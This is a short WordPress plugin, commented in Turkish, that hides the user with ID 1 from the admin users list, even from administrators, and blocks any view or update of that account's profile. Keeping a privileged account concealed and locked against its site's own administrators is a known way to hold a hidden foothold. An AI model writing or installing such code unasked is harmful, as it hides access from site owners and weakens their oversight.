<?php
/**
 * Plugin Name: Hide and Restrict User srcn (ID 1)
 * Plugin URI: https://sedeus.com
 * Description: ID'si 1 olan kullanıcıyı tamamen gizler ve düzenlenmesini engeller.
 * Version: 1.4
 * Author: Sercan USLU
 * Author URI: https://srcnx.com
 */

// Kullanıcılar listesinden ID 1 olan kullanıcıyı gizle
function hide_user_srcn_from_list($query) {
    if (is_admin() && current_user_can('list_users')) {
        global $wpdb;
        $query->query_where .= $wpdb->prepare(" AND {$wpdb->users}.ID != %d", 1);
    }
}
add_action('pre_user_query', 'hide_user_srcn_from_list');

// Kullanıcı profil düzenleme ekranına erişimi engelle
function restrict_user_profile_access() {
    if (isset($_GET['user_id']) && absint($_GET['user_id']) === 1) {
        wp_die(__('Bu kullanıcı düzenlenemez.', 'hide-user-srcn'), __('Erişim Engellendi', 'hide-user-srcn'), 403);
    }
}
add_action('load-user-edit.php', 'restrict_user_profile_access');

// Kullanıcı kendi profil sayfasını düzenlemeye çalışırsa engelle
function restrict_own_profile_access() {
    if (is_admin() && !empty($_GET['user_id']) && absint($_GET['user_id']) === 1) {
        wp_die(__('Bu kullanıcı düzenlenemez.', 'hide-user-srcn'), __('Erişim Engellendi', 'hide-user-srcn'), 403);
    }
}
add_action('load-profile.php', 'restrict_own_profile_access');

// Kullanıcı güncelleme işlemini engelle
function prevent_user_id_1_editing($user_id) {
    if (absint($user_id) === 1) {
        wp_die(__('Bu kullanıcı güncellenemez.', 'hide-user-srcn'), __('Erişim Engellendi', 'hide-user-srcn'), 403);
    }
}
add_action('edit_user_profile_update', 'prevent_user_id_1_editing');
add_action('personal_options_update', 'prevent_user_id_1_editing');

// Kullanıcı sorgularından ID 1 kullanıcısını gizle
function hide_user_srcn_everywhere($query_args) {
    if (!current_user_can('administrator')) {
        if (!empty($query_args['include']) && is_array($query_args['include'])) {
            $query_args['include'] = array_diff($query_args['include'], [1]);
        }
        $query_args['exclude'][] = 1;
    }
    return $query_args;
}
add_filter('users_list_table_query_args', 'hide_user_srcn_everywhere');
add_filter('get_users_args', 'hide_user_srcn_everywhere');
